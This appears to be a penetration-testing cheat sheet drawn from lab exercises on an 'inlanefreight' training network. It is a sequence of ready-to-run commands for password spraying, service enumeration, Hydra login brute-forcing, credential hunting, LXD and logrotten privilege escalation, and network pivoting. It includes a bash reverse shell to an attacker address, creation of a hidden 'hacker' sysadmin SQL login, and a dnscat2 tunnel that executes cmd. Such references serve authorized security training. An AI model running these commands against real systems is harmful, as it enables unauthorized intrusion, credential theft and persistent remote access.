 $ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

```
- Password Spraying using kerbrute

 $ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
 
```

```
-Password Spraying using crackmapexec

$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

### DNS

```
--bruteforcing A records

$ for sub in $(cat /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.{domain} @{dns_server} | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done
```

```
$ dnsenum --dnsserver {dns_server} --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt {domaim}
```

### FTP

```
--Connetct to ssl wrapped ftp instance

$ openssl s_client -connect x.x.x.x:21 -starttls ftp
```
```
- FTP Bounce

$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```
```
- Download all available files with wget
$ wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
```

### IMAP

```
1 LOGIN username password 	
User's login.
1 LIST "" * 	                
Lists all directories.
1 CREATE "INBOX" 	            
Creates a mailbox with a specified name.
1 DELETE "INBOX" 	            
Deletes a mailbox.
1 RENAME "ToRead" "Important" 	
Renames a mailbox.

1 LSUB "" * 	                
Returns a subset of names from the set of names that the User has declared as being active or subscribed.

1 SELECT INBOX 	                
Selects a mailbox so that messages in the mailbox can be accessed.
1 UNSELECT INBOX 	            
Exits the selected mailbox.
1 FETCH <ID> all 	            
Retrieves data associated with a message in the mailbox.
1 CLOSE 	                    
Removes all messages with the Deleted flag set.
1 LOGOUT 	                    
Closes the connection with the IMAP server.
```
```
--SSL Wrapped imap instance
$ openssl s_client -connect x.x.x.x:imaps
```

### POP3

```
USER   username 	            
Identifies the user.
PASS   password 	            
Authentication of the user using its password.
STAT 	                        
Requests the number of saved emails from the server.
LIST 	                        
Requests from the server the number and size of all emails.
RETR id 	                    
Requests the server to deliver the requested email by ID.
DELE id 	                    
Requests the server to delete the requested email by ID.
CAPA 	                        
Requests the server to display the server capabilities.
RSET 	                        
Requests the server to reset the transmitted information.
QUIT 	                        
Closes the connection with the POP3 server.
```

```
--SSL Wrapped pop3 instance

$ openssl s_client -connect x.x.x.x:pop3s
```

### IPMI

```
 $ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local


msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
```


### MSSQL

```
-Connect

$ python3 mssqlclient.py Administrator@x.x.x.x -windows-auth

$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

$ mssqlclient.py -p 1433 julio@10.129.203.7 
```
```
- msf

msfconsole> use auxiliary/scanner/mssql/mssql_ping

msfconsole> use auxiliary/scanner/mssql/mssql_login

--to enum  the schema with credentials
use scanner/mssql/mssql_schemadump 

-enumeration script
use auxiliary/admin/mssql/mssql_enum

--dumping the database
use auxiliary/scanner/mssql/mssql_schemadump

-executing commands using the xp_cmdshell
use exploit/windows/mssql/mssql_payload
        
-escalating privs using the sysadmin role
use auxiliary/admin/mssql/mssql_escalate_dbowner

-escalating privs with impersonation
use auxiliary/admin/mssql/mssql_escalate_execute_as
```

```
# Get version
select @@version;
# Get user
select user_name();
# Get databases
SELECT name FROM master.dbo.sysdatabases;
# Use database
USE master

#Get table names
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
#List Linked Servers
EXEC sp_linkedservers
SELECT * FROM sys.servers;
#List users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
#Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
EXEC sp_addsrvrolemember 'hacker', 'sysadmin'
```

```
List files of a folder in the machine

SQL> EXEC master..xp_dirtree 'c:\inetpub\wwwroot', 1 , 1

```
### MYSQL

```
-Connect
$ mysql -u {user} -p {password} -h x.x.x.x
```


```
show databases; 	                                 Show all databases.

use <database>; 	                                 Select one of the existing databases.

show tables; 	                                        Show all available tables in the selected database.

show columns from <table>; 	                        Show all columns in the selected database.

select * from <table>; 	                                Show everything in the desired table.

select * from <table> where <column> = "<string>"; 	Search for needed string in the desired table.
```

### NFS

```
--Show Available NFS Shares

$ showmount -e x.x.x.x
```

```
--Mounting NFS Share

$ mkdir local_dir
$ sudo mount -t {target_nfs} x.x.x.x:/ ./{local_dir}/ -o nolock


-Umount it after you finish

$ sudo umount ./target-NFS
 
            
```
### Oracle TNS
```
$ ./odat.py all -s 10.129.204.235
```

```
SQLplus - Log In

$ sqlplus username/password@x.x.x.x/XE;
```

### SNMP

```
$ snmpwalk -v2c -c public x.x.x.x

$ onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt x.x.x.x

$  braa <community string>@<IP>:.1.3.6.*
```

### SMPT 

```
$ telnet 10.10.110.20 25
# VRFY root


$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

```

```
- Open Relay

$ nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
```

### Hydra

```
- Http Post Form

$ hydra -l admin -P {password_list} -f 178.35.49.134 -s {port} http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```
### Ping sweep
```
$ for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```
### Linux Enviroment Enum

```
--OS Version

$ cat /etc/os-release

--Kernel Version

$ uanme -a
$ cat /proc/version



- Network

$ cat /etc/resolve.conf

$arp -a

-Mounted filesystem 

$ df -h

-Unmounted File Systems

$ cat /etc/fstab | grep -v "#" | column -t

$ lsblk

--All Hidden Directories

$ find / -type d -name ".*" -ls 2>/dev/null


--Writeable Directories

$ find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null

--Logged in Users

$ w

$ lastlog|grep -vi "**Never"

-- members of groups

$ getent group sudo

--Bash History

$ history

$ find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null

```


```
-- Cronjobs

$ ls -la /etc/cron.daily/

-With the help of pspy

$ ./pspy64 -pf -i 1000

```
```
--Running Services

$ cat /etc/shells

$ lpstat 

-List Current Processes

$ ps aux | grep root

--List instaled packages
$ apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list

```
### Credentials Hunting

```
$ find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null

$ find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"

$  find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

### LXD group

```
$ unzip alpine.zip 

$ lxd init

$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

$ lxc init alpine r00t -c security.privileged=true

$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

$ lxc start r00t

$ lxc exec r00t /bin/sh
```

### LogRotten

```
$ cd logrotten

$ gcc logrotten.c -o logrotten

$ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload

$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"

$ ./logrotten -p ./payload /tmp/tmp.log

```


# Port Forwarding

### ssh

```

- Local Port Forwarding

$ ssh -L 1234:localhost:3306 username@x.x.x.x

-Multiple Ports

$ ssh -L 1234:localhost:3306 8080:localhost:80 username@x.x.x.x


```

```

-Dynamic Port -Setting a pivot

$ ssh -D 9050 ubuntu@10.129.202.64

!/etc/proxycahins.conf last line

socks4a 127.0.0.1 9050


```
```

-Remote Port Forwarding

$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN

```


### Msf Pivoting

```
-Socks Proxy

msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050

msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0

msf6 auxiliary(server/socks_proxy) > set version 4a

msf6 auxiliary(server/socks_proxy) > run
```

```
-Route through meterpreter

msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1

msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0

msf6 post(multi/manage/autoroute) > run
```

```
---Creating Local TCP Relay

meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

-- Reverse Port Forwarding

meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

```

### Socat

```
- On the pivot

$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

### sshuttle

```
$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
```

### DNScat2

```
cd dnscat2/server/
sudo gem install bundler
bundle install


-Starting the dnscat2 server

$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

```

```

PS C:\htb> Import-Module .\dnscat2.ps1

PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

### Chisel

```
-Running the Chisel Server on the Pivot Host

$ ./chisel server -v -p 1234 --socks5

-Connect to the server from the attack machine

$ ./chisel client -v 10.129.202.64:1234 socks

```
```
--Chisel Reverse

-start the server in our attack host

$ sudo ./chisel server --reverse -v -p 1234 --socks5

$ ./chisel client -v 10.10.14.17:1234 R:socks

```


### SocksOverRDP

```
-Loading SocksOverRDP.dll using regsvr32.exe

C:\Users\htb-student\Desktop\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll

```


### Password Mutations

``` 
$ ls /usr/share/hashcat/rules/

$ hashcat --force password.list -r {rule} --stdout | sort -u > mut_password.list
```


```
$ ./username-anarchy -i /home/ltnbob/names.txt 
```

### netsh.exe Windows Port Forwarding

```
-From the pivot

C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25

```

### Building directory tree for an assesment

```
$ mkdir -p ACME-IPT/{Admin,Deliverables,Evidence/{Findings,Scans/{Vuln,Service,Web,'AD Enumeration'},Notes,OSINT,Wireless,'Logging output','Misc Files'},Retest}
```


### tmux logging

```
$ tmux new -s setup

$ cd ~/.tmux/plugins/tmux-logging/scripts && ./togle_logging.sh

! files stored in home directory
```

